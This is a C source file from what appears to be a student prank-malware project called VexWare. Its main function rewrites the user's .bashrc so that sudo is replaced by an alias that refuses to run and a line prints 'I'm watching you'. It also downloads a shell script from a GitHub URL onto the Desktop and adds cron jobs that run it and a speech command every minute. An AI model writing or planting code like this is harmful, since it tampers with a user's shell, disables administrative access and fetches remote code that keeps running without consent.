#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include "linux_src.h"

int main() {
  char* home_loc = get_home();

  char* edit =
      "\n\nalias sudo=\"echo 'My apologies, $USER, I cannot allow you to'\"";
  char* edit2 = "\necho \"Hello $USER, I'm watching you\"";
  bashrc_edit(home_loc, edit);
  bashrc_edit(home_loc, edit2);

  char* script_loc = "/Desktop/cat_sound.sh";

  download_file(home_loc, script_loc, 1,
                "https://github.com/olincollege/VexWare/raw/main/src/"
                "linux_execs/cat_sound.sh");

  add_cron_script(home_loc, script_loc, "* * * * *");

  add_cron_speak("help", "* * * * *");

  // NOLINTNEXTLINE(concurrency-mt-unsafe, cert-env33-c)
  system("exec bash");
}
